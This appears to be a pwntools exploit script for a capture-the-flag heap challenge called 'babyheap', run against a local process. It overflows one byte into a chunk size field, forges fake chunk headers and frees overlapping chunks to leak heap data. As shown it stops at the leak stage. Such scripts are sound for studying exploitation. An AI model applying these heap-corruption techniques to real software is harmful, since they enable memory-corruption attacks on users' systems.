#coding:utf-8

from pwn import *
context.log_level = 'debug'

p = process("./babyheap")

def menu(choice):
    p.sendlineafter("Command: ",  str(choice))

def add(size):
    menu(1)
    p.sendlineafter("Size: ", str(size))

def update(idx, size, content):
    menu(2)
    p.sendlineafter("Index: ", str(idx))
    p.sendlineafter("Size: ",str(size))
    p.sendafter("Content: ", content)

def delete(idx):
    menu(3)
    p.sendlineafter("Index: ", str(idx))

def show(idx):
    menu(4)
    p.sendlineafter("Index: ", str(idx))

gdb.attach(p)
add(0x18)#0
add(0x18)#1
add(0x18)#2
add(0x18)#3
add(0x48)#4
add(0x58)#5
add(0x50)#6

update(0, 0x19, "A"*0x18+"\x61")

delete(1)
add(0x58)

update(1, 0x58, p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+p64(0)*3)
delete(3)
delete(2)


show(1)
print(p.recvuntil("\nCommand"))


